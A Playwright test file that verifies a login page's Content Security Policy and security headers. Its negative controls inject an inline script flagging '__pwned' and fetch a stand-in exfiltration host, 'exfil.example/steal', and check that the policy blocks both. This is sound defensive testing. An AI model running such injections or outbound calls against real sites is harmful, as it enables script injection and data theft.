import { contentSecurityPolicy } from '../security-headers';
import { expect, test } from './fixtures';

test.describe('security headers and CSP', () => {
  test('the document is served with the policy from security-headers.ts', async ({ page }) => {
    const res = await page.goto('/login');
    const headers = res!.headers();
    expect(headers['content-security-policy']).toBe(
      contentSecurityPolicy(process.env.VITE_SUPABASE_URL!),
    );
    expect(headers['content-security-policy']).toContain("frame-ancestors 'none'");
    expect(headers['content-security-policy']).not.toContain('unsafe-inline');
    expect(headers['x-content-type-options']).toBe('nosniff');
    expect(headers['referrer-policy']).toBe('no-referrer');
  });

  // Negative controls: prove the policy is live, so "no violations" elsewhere means something.
  test('an injected inline script is blocked and reported', async ({ page, csp }) => {
    csp.expectViolations();
    await page.goto('/login');
    await page.evaluate(() => {
      const s = document.createElement('script');
      s.textContent = 'window.__pwned = true';
      document.body.append(s);
    });
    await expect.poll(() => csp.violations.map((v) => v.directive)).toContain('script-src-elem');
    expect(
      await page.evaluate(() => (window as unknown as { __pwned?: boolean }).__pwned),
    ).toBeUndefined();
  });

  test('a request to an origin outside connect-src is blocked and reported', async ({
    page,
    csp,
  }) => {
    csp.expectViolations();
    await page.goto('/login');
    const outcome = await page.evaluate(() =>
      fetch('https://exfil.example/steal').then(
        () => 'sent',
        () => 'blocked',
      ),
    );
    expect(outcome).toBe('blocked');
    await expect.poll(() => csp.violations.map((v) => v.directive)).toContain('connect-src');
  });
});
